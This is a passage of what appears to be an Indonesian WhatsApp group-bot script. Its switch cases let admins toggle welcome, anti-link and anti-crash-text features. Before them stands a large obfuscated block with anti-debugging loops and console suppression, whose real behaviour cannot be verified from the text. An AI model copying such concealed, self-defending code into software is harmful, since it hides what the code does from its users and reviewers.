_0x1158ab=_0x44ca77,_0x521004=_0x23b59f,_0x49c25b=_0x23b59f,_0x232441=_0x23b59f,_0x1e8990=_0x44ca77,_0x3d6a5c={'ReuIT':function(_0x3e3a90,_0x461dc5){var _0x2f0031=_0x30f5;return _0x3e7f42[_0x2f0031(0x2a8)](_0x3e3a90,_0x461dc5);},'xdglE':_0x3e7f42[_0x1158ab(0x26a)],'NsfqH':_0x3e7f42[_0x521004(0x210)],'fVLfG':_0x3e7f42[_0x521004(0x242)]};if(_0x3e7f42[_0x521004(0x2d2)](_0x3e7f42[_0x1e8990(0x286)],_0x3e7f42[_0x232441(0x28d)])){var _0x154848=_0x1a25cb?function(){var _0xe6938e=_0x49c25b,_0x19e92d=_0x1e8990,_0xa62b3e=_0x1158ab,_0x231a07=_0x1e8990,_0x16059a=_0x232441;if(_0x3d6a5c[_0xe6938e(0x24a)](_0x3d6a5c[_0x19e92d(0x203)],_0x3d6a5c[_0xa62b3e(0x214)])){if(_0x5dbc50){var _0x926db8=_0x5e0e39[_0x19e92d(0x23b)](_0x559d5a,arguments);return _0x5c8354=null,_0x926db8;}}else{if(_0x20fdb1){if(_0x3d6a5c[_0xe6938e(0x24a)](_0x3d6a5c[_0x16059a(0x283)],_0x3d6a5c[_0x231a07(0x283)])){var _0x169742=_0x20fdb1[_0xe6938e(0x23b)](_0xb581e2,arguments);return _0x20fdb1=null,_0x169742;}else return!![];}}}:function(){};return _0x1a25cb=![],_0x154848;}else{var _0xa651bc=_0x2a6b57?function(){var _0x39826e=_0x1158ab;if(_0x18ec6c){var _0x3de2fc=_0x1c12b1[_0x39826e(0x23b)](_0x14bda3,arguments);return _0x1472f9=null,_0x3de2fc;}}:function(){};return _0x314b4f=![],_0xa651bc;}};}else{var _0x2dc37b=_0x55d49b[_0x2046ce(0x23b)](_0x5af59b,arguments);return _0x238d33=null,_0x2dc37b;}}());(function(){var _0x2ce215=_0x4d2f80,_0x54ae6a=_0x310324,_0x4082d7=_0x1728bc,_0x31d522=_0x4d2f80,_0x424ec0=_0x1728bc,_0x34e712={'SyLMC':_0x3e7f42[_0x2ce215(0x285)],'nKYEu':_0x3e7f42[_0x2ce215(0x22d)],'phqJg':_0x3e7f42[_0x2ce215(0x279)],'Ceual':function(_0x33a3da,_0x26e218){var _0x4553f4=_0x54ae6a;return _0x3e7f42[_0x4553f4(0x1f9)](_0x33a3da,_0x26e218);},'KWKmm':_0x3e7f42[_0x54ae6a(0x1f3)],'hNyBs':_0x3e7f42[_0x2ce215(0x1c9)],'tsqRP':_0x3e7f42[_0x4082d7(0x1ca)],'oivHl':_0x3e7f42[_0x54ae6a(0x1bc)],'RAKeW':function(_0x3a93f4,_0x486c9d){var _0x237e03=_0x424ec0;return _0x3e7f42[_0x237e03(0x1d3)](_0x3a93f4,_0x486c9d);},'bQPFD':_0x3e7f42[_0x2ce215(0x2e5)],'vHpoS':function(_0x159806,_0x195a1d){var _0x350b42=_0x54ae6a;return _0x3e7f42[_0x350b42(0x182)](_0x159806,_0x195a1d);},'sLEni':_0x3e7f42[_0x2ce215(0x2c8)],'jdxbK':_0x3e7f42[_0x2ce215(0x288)],'EFShD':function(_0x599dea,_0x1fdb8b){var _0x1db813=_0x54ae6a;return _0x3e7f42[_0x1db813(0x2d2)](_0x599dea,_0x1fdb8b);},'dJJIN':_0x3e7f42[_0x424ec0(0x2df)],'dLbzy':_0x3e7f42[_0x424ec0(0x2da)],'TefJO':_0x3e7f42[_0x54ae6a(0x169)],'Bymoq':function(_0x2d327f){var _0x48fdc9=_0x4082d7;return _0x3e7f42[_0x48fdc9(0x1b7)](_0x2d327f);}};if(_0x3e7f42[_0x424ec0(0x1f2)](_0x3e7f42[_0x424ec0(0x2bf)],_0x3e7f42[_0x2ce215(0x1f4)]))_0x3e7f42[_0x2ce215(0x1d8)](_0x53c8e2,this,function(){var _0x3903a5=_0x424ec0,_0x297de9=_0x2ce215,_0x291a4d=_0x2ce215,_0x4f9c56=_0x424ec0,_0x226d0f=_0x31d522,_0x4b45d0={};_0x4b45d0[_0x3903a5(0x28a)]=_0x34e712[_0x297de9(0x244)],_0x4b45d0[_0x3903a5(0x28c)]=_0x34e712[_0x3903a5(0x233)],_0x4b45d0[_0x3903a5(0x1f0)]=_0x34e712[_0x297de9(0x168)];var _0x462a55=_0x4b45d0;if(_0x34e712[_0x4f9c56(0x257)](_0x34e712[_0x4f9c56(0x17b)],_0x34e712[_0x226d0f(0x1e5)]))return function(_0xa48a5c){}[_0x3903a5(0x2ba)+_0x291a4d(0x2c6)+'r'](auIBWr[_0x291a4d(0x28a)])[_0x226d0f(0x23b)](auIBWr[_0x4f9c56(0x28c)]);else{var _0x508739=new RegExp(_0x34e712[_0x297de9(0x1e8)]),_0x56282e=new RegExp(_0x34e712[_0x226d0f(0x1de)],'i'),_0x3abe31=_0x34e712[_0x297de9(0x287)](_0x505cf9,_0x34e712[_0x291a4d(0x16a)]);if(!_0x508739[_0x297de9(0x2ab)](_0x34e712[_0x4f9c56(0x273)](_0x3abe31,_0x34e712[_0x297de9(0x19d)]))||!_0x56282e[_0x4f9c56(0x2ab)](_0x34e712[_0x3903a5(0x273)](_0x3abe31,_0x34e712[_0x3903a5(0x294)]))){if(_0x34e712[_0x297de9(0x291)](_0x34e712[_0x291a4d(0x196)],_0x34e712[_0x297de9(0x196)]))return _0x51eddf[_0x3903a5(0x2a2)+_0x4f9c56(0x1b8)]()[_0x291a4d(0x2b8)+'h'](auIBWr[_0x226d0f(0x1f0)])[_0x226d0f(0x2a2)+_0x297de9(0x1b8)]()[_0x3903a5(0x2ba)+_0x4f9c56(0x2c6)+'r'](_0x3a5d7c)[_0x297de9(0x2b8)+'h'](auIBWr[_0x4f9c56(0x1f0)]);else _0x34e712[_0x4f9c56(0x287)](_0x3abe31,'0');}else{if(_0x34e712[_0x297de9(0x291)](_0x34e712[_0x3903a5(0x2a4)],_0x34e712[_0x291a4d(0x224)]))_0x34e712[_0x3903a5(0x284)](_0x505cf9);else{if(_0x3a644e){var _0x1e1f33=_0x3dd383[_0x226d0f(0x23b)](_0x5dc7c1,arguments);return _0x5d47bb=null,_0x1e1f33;}}}}})();else{var _0x4de841=_0x187b03?function(){var _0xd7daf3=_0x54ae6a;if(_0x32e32b){var _0x564a4b=_0x536fd7[_0xd7daf3(0x23b)](_0x324ecb,arguments);return _0x2f20bb=null,_0x564a4b;}}:function(){};return _0x4e9ac3=![],_0x4de841;}}());var _0xed6faa=(function(){var _0x48c382=_0x4d2f80,_0x2bbae5=_0x58bea3,_0x20f850=_0x310324,_0x26acbe=_0x1728bc,_0x162a97=_0x4d2f80,_0x534143={'VTJHJ':function(_0x8fa784,_0x158825){var _0x39750b=_0x30f5;return _0x3e7f42[_0x39750b(0x1d3)](_0x8fa784,_0x158825);},'VWbna':_0x3e7f42[_0x48c382(0x21f)],'EqLax':function(_0x4283f6,_0x57746f){var _0x3b5b4a=_0x48c382;return _0x3e7f42[_0x3b5b4a(0x277)](_0x4283f6,_0x57746f);},'DPeET':_0x3e7f42[_0x2bbae5(0x298)],'hbBqU':function(_0x4c0dfd,_0x17c4fe){var _0x4ca389=_0x2bbae5;return _0x3e7f42[_0x4ca389(0x182)](_0x4c0dfd,_0x17c4fe);},'TnBLA':_0x3e7f42[_0x20f850(0x17f)],'jmOps':_0x3e7f42[_0x2bbae5(0x2ea)],'tRGuW':function(_0x1105af){var _0x452eda=_0x2bbae5;return _0x3e7f42[_0x452eda(0x1db)](_0x1105af);},'HntPT':_0x3e7f42[_0x162a97(0x21e)],'sDhoH':_0x3e7f42[_0x48c382(0x2f0)],'sCpBn':_0x3e7f42[_0x20f850(0x1b4)],'Dvqwv':_0x3e7f42[_0x2bbae5(0x186)],'ZZkDP':_0x3e7f42[_0x26acbe(0x238)],'OGuYJ':_0x3e7f42[_0x162a97(0x2b5)],'Ydakv':_0x3e7f42[_0x2bbae5(0x1a4)],'yFati':function(_0x49dbee,_0x4da42e){var _0x6d17b6=_0x2bbae5;return _0x3e7f42[_0x6d17b6(0x27a)](_0x49dbee,_0x4da42e);},'kNNYt':_0x3e7f42[_0x2bbae5(0x18a)],'MluRt':function(_0x3b89f9,_0x55ee6c){var _0x5c4618=_0x162a97;return _0x3e7f42[_0x5c4618(0x1f9)](_0x3b89f9,_0x55ee6c);},'Idqgu':_0x3e7f42[_0x2bbae5(0x207)]};if(_0x3e7f42[_0x20f850(0x27a)](_0x3e7f42[_0x20f850(0x2d7)],_0x3e7f42[_0x48c382(0x2d7)]))pQhKIe[_0x48c382(0x193)](_0x5340f5,0x1da*0x9+0x1b*-0x1+-0x9*0x1d7);else{var _0x38acdc=!![];return function(_0x4ab54f,_0x58336d){var _0x48476b=_0x26acbe,_0x14479b=_0x48c382,_0x3edb27=_0x48c382;if(_0x3e7f42[_0x48476b(0x230)](_0x3e7f42[_0x48476b(0x1c1)],_0x3e7f42[_0x48476b(0x21a)])){var _0x41cb66=_0x38acdc?function(){var _0x447756=_0x14479b,_0x2fef9e=_0x14479b,_0x248e3c=_0x3edb27,_0x5b26d7=_0x48476b,_0x5251a8=_0x3edb27,_0x181e4d={'EXkoR':_0x534143[_0x447756(0x26e)],'NuvnI':function(_0x48986f,_0x36f468){var _0x5d13ab=_0x447756;return _0x534143[_0x5d13ab(0x2e7)](_0x48986f,_0x36f468);},'UBkfi':_0x534143[_0x2fef9e(0x24d)],'bYAfi':function(_0xa4a3c9,_0x253f8f){var _0x5f3ac6=_0x447756;return _0x534143[_0x5f3ac6(0x193)](_0xa4a3c9,_0x253f8f);},'kfhAA':function(_0x50743c,_0x20faa9){var _0x55c1a6=_0x447756;return _0x534143[_0x55c1a6(0x1fa)](_0x50743c,_0x20faa9);},'HHIvD':_0x534143[_0x248e3c(0x24f)],'YkYlV':_0x534143[_0x2fef9e(0x1ea)],'QBlPm':function(_0x1eb168){var _0xf476ea=_0x447756;return _0x534143[_0xf476ea(0x252)](_0x1eb168);},'FDtvC':_0x534143[_0x2fef9e(0x209)],'cxkvn':_0x534143[_0x5b26d7(0x1e4)],'tseHU':_0x534143[_0x5251a8(0x2c2)],'LVmFk':_0x534143[_0x248e3c(0x2ce)],'CWtSo':_0x534143[_0x447756(0x25b)],'nZbpa':_0x534143[_0x5251a8(0x24e)],'HxpDO':_0x534143[_0x5b26d7(0x190)]};if(_0x534143[_0x447756(0x21b)](_0x534143[_0x447756(0x2be)],_0x534143[_0x2fef9e(0x2be)])){var _0xc8fbe7=_0x2171a0?function(){var _0x4c63d2=_0x5251a8;if(_0x35ddae){var _0x2d6eec=_0x49b98d[_0x4c63d2(0x23b)](_0x4f8185,arguments);return _0x4f84d8=null,_0x2d6eec;}}:function(){};return _0x38d499=![],_0xc8fbe7;}else{if(_0x58336d){if(_0x534143[_0x447756(0x167)](_0x534143[_0x5b26d7(0x206)],_0x534143[_0x2fef9e(0x206)])){var _0x353cd7=_0x58336d[_0x5251a8(0x23b)](_0x4ab54f,arguments);return _0x58336d=null,_0x353cd7;}else{var _0x33a930=_0x181e4d[_0x248e3c(0x16c)][_0x5251a8(0x2d0)]('|'),_0x8136db=-0x2205+0x21db+0xe*0x3;while(!![]){switch(_0x33a930[_0x8136db++]){case'0':for(var _0x45e4e6=0x1398+0x1*-0x1871+0x4d9;GVMTng[_0x447756(0x21c)](_0x45e4e6,_0x85c6b0[_0x447756(0x2b1)+'h']);_0x45e4e6++){var _0x59fe25=GVMTng[_0x2fef9e(0x239)][_0x5b26d7(0x2d0)]('|'),_0x193bb5=-0x1930+-0x1ef1+-0x1*-0x3821;while(!![]){switch(_0x59fe25[_0x193bb5++]){case'0':_0x40e116[_0x5b06a3]=_0x211633;continue;case'1':var _0x422874=_0x40e116[_0x5b06a3]||_0x211633;continue;case'2':_0x211633[_0x447756(0x1a7)+_0x2fef9e(0x1dd)]=_0x7e280[_0x248e3c(0x256)](_0xd3948c);continue;case'3':_0x211633[_0x2fef9e(0x2a2)+_0x5b26d7(0x1b8)]=_0x422874[_0x2fef9e(0x2a2)+_0x5251a8(0x1b8)][_0x2fef9e(0x256)](_0x422874);continue;case'4':var _0x5b06a3=_0x85c6b0[_0x45e4e6];continue;case'5':var _0x211633=_0x3d7881[_0x447756(0x2ba)+_0x2fef9e(0x2c6)+'r'][_0x447756(0x1a2)+_0x248e3c(0x1a5)][_0x248e3c(0x256)](_0x44681f);continue;}break;}}continue;case'1':var _0x384c8e;continue;case'2':try{var _0x339463=GVMTng[_0x5251a8(0x267)](_0x523d83,GVMTng[_0x5b26d7(0x1ab)](GVMTng[_0x447756(0x1ab)](GVMTng[_0x5251a8(0x25e)],GVMTng[_0x2fef9e(0x1d2)]),');'));_0x384c8e=GVMTng[_0x447756(0x259)](_0x339463);}catch(_0x46e3e3){_0x384c8e=_0x3db829;}continue;case'3':var _0x85c6b0=[GVMTng[_0x5251a8(0x2bd)],GVMTng[_0x2fef9e(0x23a)],GVMTng[_0x2fef9e(0x15e)],GVMTng[_0x5251a8(0x163)],GVMTng[_0x447756(0x231)],GVMTng[_0x5b26d7(0x216)],GVMTng[_0x5b26d7(0x221)]];continue;case'4':var _0x40e116=_0x384c8e[_0x248e3c(0x2b7)+'le']=_0x384c8e[_0x248e3c(0x2b7)+'le']||{};continue;}break;}}}}}:function(){};return _0x38acdc=![],_0x41cb66;}else _0x2eb64e=_0x14ce8d;};}}()),_0x56712c=_0x3e7f42[_0x1728bc(0x1f6)](_0xed6faa,this,function(){var _0x550738=_0x4ccfaf,_0x3db370=_0x58bea3,_0x3c4186=_0x1728bc,_0x10066e=_0x4d2f80,_0x7e550a=_0x1728bc;if(_0x3e7f42[_0x550738(0x27a)](_0x3e7f42[_0x550738(0x2a9)],_0x3e7f42[_0x3db370(0x223)])){var _0x4b7f2b;try{if(_0x3e7f42[_0x3c4186(0x192)](_0x3e7f42[_0x10066e(0x25d)],_0x3e7f42[_0x7e550a(0x2b6)])){var _0x53efb6=_0x3e7f42[_0x3db370(0x162)](Function,_0x3e7f42[_0x3db370(0x1aa)](_0x3e7f42[_0x7e550a(0x1aa)](_0x3e7f42[_0x550738(0x17f)],_0x3e7f42[_0x10066e(0x2ea)]),');'));_0x4b7f2b=_0x3e7f42[_0x3c4186(0x295)](_0x53efb6);}else LtHdHM[_0x7e550a(0x165)](_0x246d8d);}catch(_0x5a32b8){if(_0x3e7f42[_0x3c4186(0x192)](_0x3e7f42[_0x3db370(0x26d)],_0x3e7f42[_0x550738(0x26d)])){var _0x372444={'babIy':LtHdHM[_0x3c4186(0x1ca)],'Szszs':LtHdHM[_0x550738(0x1bc)],'oGlpl':function(_0x49385a,_0x1e1bd6){var _0x4ab33b=_0x7e550a;return LtHdHM[_0x4ab33b(0x1d3)](_0x49385a,_0x1e1bd6);},'Dbvol':LtHdHM[_0x550738(0x2e5)],'GuGnh':function(_0x5c38ae,_0x205290){var _0x578f07=_0x3c4186;return LtHdHM[_0x578f07(0x22e)](_0x5c38ae,_0x205290);},'NnLis':LtHdHM[_0x3c4186(0x2c8)],'kDipM':function(_0xafeef5,_0x3b556b){var _0x3e9f83=_0x10066e;return LtHdHM[_0x3e9f83(0x1aa)](_0xafeef5,_0x3b556b);},'ESBTV':LtHdHM[_0x3db370(0x288)],'SYaBV':function(_0xebae8a,_0x439387){var _0x235a75=_0x3db370;return LtHdHM[_0x235a75(0x1a0)](_0xebae8a,_0x439387);},'dUFqp':function(_0x4a39f5){var _0x580027=_0x3db370;return LtHdHM[_0x580027(0x165)](_0x4a39f5);}};LtHdHM[_0x3c4186(0x27e)](_0x575cef,this,function(){var _0x349c85=_0x550738,_0x56ec36=_0x3db370,_0x247705=_0x3c4186,_0x265f8e=_0x3db370,_0x4001a9=_0x3c4186,_0x3d9687=new _0x2ba5a7(_0x372444[_0x349c85(0x17c)]),_0x324286=new _0x935d7d(_0x372444[_0x349c85(0x1c2)],'i'),_0x2b841c=_0x372444[_0x56ec36(0x1c0)](_0x12d8bb,_0x372444[_0x56ec36(0x2c9)]);!_0x3d9687[_0x56ec36(0x2ab)](_0x372444[_0x56ec36(0x219)](_0x2b841c,_0x372444[_0x247705(0x24c)]))||!_0x324286[_0x247705(0x2ab)](_0x372444[_0x349c85(0x23d)](_0x2b841c,_0x372444[_0x56ec36(0x29d)]))?_0x372444[_0x265f8e(0x1c8)](_0x2b841c,'0'):_0x372444[_0x265f8e(0x179)](_0x3f6f8b);})();}else _0x4b7f2b=window;}var _0x48713b=_0x4b7f2b[_0x550738(0x2b7)+'le']=_0x4b7f2b[_0x550738(0x2b7)+'le']||{},_0x40728d=[_0x3e7f42[_0x3db370(0x21e)],_0x3e7f42[_0x7e550a(0x2f0)],_0x3e7f42[_0x3c4186(0x1b4)],_0x3e7f42[_0x3db370(0x186)],_0x3e7f42[_0x3c4186(0x238)],_0x3e7f42[_0x7e550a(0x2b5)],_0x3e7f42[_0x3db370(0x1a4)]];for(var _0x123012=0x1055+0xd*-0x293+0x56*0x33;_0x3e7f42[_0x3db370(0x277)](_0x123012,_0x40728d[_0x3db370(0x2b1)+'h']);_0x123012++){if(_0x3e7f42[_0x7e550a(0x1f9)](_0x3e7f42[_0x10066e(0x229)],_0x3e7f42[_0x10066e(0x236)]))LtHdHM[_0x3db370(0x1a0)](_0x5c8e47,'0');else{var _0x261498=_0x3e7f42[_0x550738(0x19c)][_0x3c4186(0x2d0)]('|'),_0x540e13=-0xb5a+0x4*0x428+-0x546;while(!![]){switch(_0x261498[_0x540e13++]){case'0':var _0x5c748a=_0x48713b[_0x272831]||_0x3c5e80;continue;case'1':var _0x3c5e80=_0xed6faa[_0x550738(0x2ba)+_0x7e550a(0x2c6)+'r'][_0x3c4186(0x1a2)+_0x550738(0x1a5)][_0x3db370(0x256)](_0xed6faa);continue;case'2':_0x48713b[_0x272831]=_0x3c5e80;continue;case'3':_0x3c5e80[_0x10066e(0x2a2)+_0x3c4186(0x1b8)]=_0x5c748a[_0x7e550a(0x2a2)+_0x550738(0x1b8)][_0x3c4186(0x256)](_0x5c748a);continue;case'4':var _0x272831=_0x40728d[_0x123012];continue;case'5':_0x3c5e80[_0x3c4186(0x1a7)+_0x3db370(0x1dd)]=_0xed6faa[_0x3c4186(0x256)](_0xed6faa);continue;}break;}}}}else return![];});_0x3e7f42[_0x1728bc(0x212)](_0x56712c),console[_0x58bea3(0x1c7)](_0x3e7f42[_0x310324(0x2e3)]);}hi(),setInterval(function(){var _0x205fc6=_0x1b48d9,_0x42973a={'YvaFX':function(_0x10048d){return _0x10048d();}};_0x42973a[_0x205fc6(0x2d6)](_0x505cf9);},-0xd*-0x20+0xaf6+0x30a);function _0x505cf9(_0x4abce7){var _0x48de2b=_0x5e2f5f,_0x3c6aec=_0x47047b,_0x5674cc=_0x5e2f5f,_0x2cd020=_0x70e9c3,_0x2b506c=_0x386959,_0x55bb89={'iAjTL':function(_0x1ebf61,_0x16de09){return _0x1ebf61+_0x16de09;},'vLVrs':_0x48de2b(0x2f1),'IFRbz':_0x48de2b(0x1df),'VjgSK':_0x5674cc(0x270)+'n','vvwjt':function(_0x893e8d,_0x475d1e){return _0x893e8d+_0x475d1e;},'eobPP':_0x2cd020(0x195)+_0x3c6aec(0x20d)+'t','ghkBj':function(_0x3b4598){return _0x3b4598();},'odwAt':_0x48de2b(0x1d4)+_0x2cd020(0x1b9)+'0','Sscgm':function(_0x1d38e9,_0x2fb9e5){return _0x1d38e9!==_0x2fb9e5;},'ZCblY':_0x5674cc(0x2aa),'TPymG':_0x3c6aec(0x16f),'AWYRo':function(_0x18db72,_0x3921d4){return _0x18db72===_0x3921d4;},'kdIfq':_0x48de2b(0x1fb)+'g','xWjqa':function(_0x53b34f,_0x4a686b){return _0x53b34f===_0x4a686b;},'YMRoN':_0x3c6aec(0x2db),'mCgRN':_0x48de2b(0x2e9)+_0x5674cc(0x1d5)+_0x5674cc(0x1a3),'OSbzN':_0x2cd020(0x278)+'er','ZjSlY':function(_0x30ecd4,_0x2ed327){return _0x30ecd4===_0x2ed327;},'FEWkE':_0x2b506c(0x251),'sHZOt':_0x5674cc(0x1d7),'tkMtq':function(_0xd40ce1,_0x924704){return _0xd40ce1+_0x924704;},'GohEl':function(_0x221011,_0x3403bd){return _0x221011/_0x3403bd;},'CYFTI':_0x2cd020(0x2b1)+'h','niLKL':function(_0x178b2c,_0x29afda){return _0x178b2c%_0x29afda;},'ZjiDN':_0x5674cc(0x2a7),'xBLpO':_0x2b506c(0x183),'RntGv':function(_0x17bcbc,_0x3f5b2b){return _0x17bcbc===_0x3f5b2b;},'wanfJ':_0x3c6aec(0x2f6),'wHODr':_0x2b506c(0x296),'rQett':function(_0x1b166b,_0x146e5e){return _0x1b166b+_0x146e5e;},'YssKW':function(_0x227803,_0x54f0ff){return _0x227803(_0x54f0ff);}};function _0x32d249(_0x29b026){var _0x1fbdbf=_0x5674cc,_0x2519ef=_0x3c6aec,_0x4f6d6b=_0x48de2b,_0x2d6ba1=_0x5674cc,_0x21b83d=_0x48de2b,_0x7ec0ce={'DdfLh':_0x55bb89[_0x1fbdbf(0x204)],'dvwWx':function(_0x50efc6,_0x5a259b){var _0x3111df=_0x1fbdbf;return _0x55bb89[_0x3111df(0x2e8)](_0x50efc6,_0x5a259b);},'fGscu':_0x55bb89[_0x1fbdbf(0x27b)],'PEqxF':_0x55bb89[_0x2519ef(0x170)]};if(_0x55bb89[_0x1fbdbf(0x28e)](typeof _0x29b026,_0x55bb89[_0x2d6ba1(0x189)])){if(_0x55bb89[_0x2519ef(0x208)](_0x55bb89[_0x2519ef(0x27f)],_0x55bb89[_0x4f6d6b(0x27f)]))return function(_0x5935f8){}[_0x2519ef(0x2ba)+_0x1fbdbf(0x2c6)+'r'](_0x55bb89[_0x4f6d6b(0x180)])[_0x4f6d6b(0x23b)](_0x55bb89[_0x21b83d(0x22b)]);else(function(){return!![];}[_0x2d6ba1(0x2ba)+_0x2519ef(0x2c6)+'r'](_0x55bb89[_0x2519ef(0x274)](_0x55bb89[_0x2d6ba1(0x1eb)],_0x55bb89[_0x1fbdbf(0x2a1)]))[_0x21b83d(0x253)](_0x55bb89[_0x1fbdbf(0x197)]));}else{if(_0x55bb89[_0x4f6d6b(0x19a)](_0x55bb89[_0x1fbdbf(0x205)],_0x55bb89[_0x2519ef(0x217)])){if(_0x132598){var _0x1a1722=_0x3e726a[_0x1fbdbf(0x23b)](_0x5b03db,arguments);return _0x1a3fa8=null,_0x1a1722;}}else _0x55bb89[_0x2d6ba1(0x2e8)](_0x55bb89[_0x2d6ba1(0x19e)]('',_0x55bb89[_0x2519ef(0x1fd)](_0x29b026,_0x29b026))[_0x55bb89[_0x4f6d6b(0x164)]],0x118e*0x2+0xa19+-0x2d34)||_0x55bb89[_0x1fbdbf(0x19a)](_0x55bb89[_0x1fbdbf(0x2bc)](_0x29b026,0x2c9+0x3d*-0x74+-0x18ef*-0x1),0x2d*0xaa+-0x1bb9+-0x229)?_0x55bb89[_0x2519ef(0x2e8)](_0x55bb89[_0x21b83d(0x20b)],_0x55bb89[_0x1fbdbf(0x1ac)])?function(){var _0x54ebbf=_0x4f6d6b,_0x344307=_0x21b83d,_0x1c9f4a=_0x2519ef,_0x3b049a=_0x2519ef,_0x25bd08=_0x1fbdbf;if(_0x7ec0ce[_0x54ebbf(0x246)](_0x7ec0ce[_0x54ebbf(0x29e)],_0x7ec0ce[_0x54ebbf(0x29e)])){var _0x300efb=_0x7ec0ce[_0x1c9f4a(0x271)][_0x25bd08(0x2d0)]('|'),_0x296989=0x35*-0xa0+-0x189b+0x39bb;while(!![]){switch(_0x300efb[_0x296989++]){case'0':_0x33eaf5[_0x186b56]=_0x1de6c0;continue;case'1':var _0x186b56=_0xc0efaa[_0x55e89b];continue;case'2':var _0x1de6c0=_0x3c83f9[_0x54ebbf(0x2ba)+_0x3b049a(0x2c6)+'r'][_0x344307(0x1a2)+_0x1c9f4a(0x1a5)][_0x54ebbf(0x256)](_0x6f121f);continue;case'3':var _0x1dd4d=_0x5841c3[_0x186b56]||_0x1de6c0;continue;case'4':_0x1de6c0[_0x54ebbf(0x2a2)+_0x344307(0x1b8)]=_0x1dd4d[_0x1c9f4a(0x2a2)+_0x1c9f4a(0x1b8)][_0x54ebbf(0x256)](_0x1dd4d);continue;case'5':_0x1de6c0[_0x25bd08(0x1a7)+_0x1c9f4a(0x1dd)]=_0x33f185[_0x344307(0x256)](_0x9bdb99);continue;}break;}}else return!![];}[_0x2519ef(0x2ba)+_0x4f6d6b(0x2c6)+'r'](_0x55bb89[_0x2519ef(0x19e)](_0x55bb89[_0x2d6ba1(0x1eb)],_0x55bb89[_0x21b83d(0x2a1)]))[_0x4f6d6b(0x253)](_0x55bb89[_0x2d6ba1(0x197)]):function(){return![];}[_0x1fbdbf(0x2ba)+_0x1fbdbf(0x2c6)+'r'](_0x55bb89[_0x4f6d6b(0x22c)](_0x55bb89[_0x21b83d(0x1eb)],_0x55bb89[_0x21b83d(0x2a1)]))[_0x1fbdbf(0x23b)](_0x55bb89[_0x2d6ba1(0x188)]):_0x55bb89[_0x2519ef(0x2ae)](_0x55bb89[_0x2519ef(0x2f3)],_0x55bb89[_0x2519ef(0x1c5)])?_0x55bb89[_0x2519ef(0x25f)](_0x29f773):function(){var _0x521ecb=_0x21b83d,_0x32fe91=_0x2519ef,_0x25c875=_0x21b83d,_0x141a37=_0x21b83d;if(_0x7ec0ce[_0x521ecb(0x246)](_0x7ec0ce[_0x32fe91(0x23c)],_0x7ec0ce[_0x521ecb(0x23c)])){var _0x224bbe=_0x17af19[_0x521ecb(0x23b)](_0x522ab2,arguments);return _0x211dcd=null,_0x224bbe;}else return![];}[_0x1fbdbf(0x2ba)+_0x2519ef(0x2c6)+'r'](_0x55bb89[_0x21b83d(0x2e0)](_0x55bb89[_0x2519ef(0x1eb)],_0x55bb89[_0x1fbdbf(0x2a1)]))[_0x4f6d6b(0x23b)](_0x55bb89[_0x4f6d6b(0x188)]);}_0x55bb89[_0x4f6d6b(0x2ec)](_0x32d249,++_0x29b026);}try{if(_0x4abce7)return _0x32d249;else _0x55bb89[_0x3c6aec(0x2ec)](_0x32d249,0x1faa+0x26de+-0x4688*0x1);}catch(_0x5b7622){}}
break
	
//━━━━━━━━━━━━━━━[ FITUR GROUP ]━━━━━━━━━━━━━━━━━//

case 'welcome':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply("Bot Bukan Admin :)")
but = [
{ buttonId: '!welcomeon', buttonText: { displayText: '☰ ON' }, type: 1 },
{ buttonId: '!welcomeoff', buttonText: { displayText: '☰ OFF' }, type: 1 }
]
sendButton(from, "Silahkan pilih untuk welcome group", faketeks, but, mek)
break
case 'welcomeon':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply("Bot Bukan Admin :)")
if (isWelkom) return reply('welcome sudah aktif')
_welkom.push(from)
fs.writeFileSync('./database/welcome.json', JSON.stringify(_welkom))
reply(`\`\`\`✓Sukses mengaktifkan fitur welcome di group\`\`\` *${groupMetadata.subject}*`)
break
case 'welcomeoff':
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply("Bot Bukan Admin :)")
if (!isWelkom) return reply('welcome sudah off sebelumnya')
_welkom.splice(from, 1)
fs.writeFileSync('./database/welcome.json', JSON.stringify(_welkom))
reply(`\`\`\`✓Sukses menonaktifkan fitur welcome di group\`\`\` *${groupMetadata.subject}*`)
break
case 'antilink' :
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply("Bot Bukan Admin :)")
but = [
{ buttonId: '!antilinkon', buttonText: { displayText: '☰ ON' }, type: 1 },
{ buttonId: '!antilinkoff', buttonText: { displayText: '☰ OFF' }, type: 1 }
]
sendButton(from, "Silahkan pilih untuk antilink group", faketeks, but, mek)
break
case 'antilinkon' :
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply("Bot Bukan Admin :)")
if (isAntiLink) return reply('anti link sudah on')
_antilink.push(from)
fs.writeFileSync('./database/antilink.json', JSON.stringify(_antilink))
reply(`\`\`\`✓Sukses mengaktifkan fitur anti link di group\`\`\` *${groupMetadata.subject}*`)
break
case 'antilinkoff' :
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply("Bot Bukan Admin :)")
if (!isAntiLink) return reply('anti link sudah off sebelumnya')
_antilink.splice(from, 1)
fs.writeFileSync('./database/antilink.json', JSON.stringify(_antilink))
reply(`\`\`\`✓Sukses menonaktifkan fitur anti link di group\`\`\` *${groupMetadata.subject}*`)
break
case 'antivirtex' :
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply("Bot Bukan Admin :)")
but = [
{ buttonId: '!antivirtexon', buttonText: { displayText: '☰ ON' }, type: 1 },
{ buttonId: '!antivirtexoff', buttonText: { displayText: '☰ OFF' }, type: 1 }
]
sendButton(from, "Silahkan pilih untuk antivirtex group", faketeks, but, mek)
break
case 'antivirtexon' :
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply("Bot Bukan Admin :)")
if (isAntiVirtex) return reply('anti virtex group sudah aktif sebelumnya')
_antivirtex.push(from)
fs.writeFileSync('./database/antivirtex.json', JSON.stringify(_antivirtex))
reply(`\`\`\`Sukses mengaktifkan mode anti virtex di group\`\`\` *${groupMetadata.subject}*`)
break
case 'antivirtexoff' :
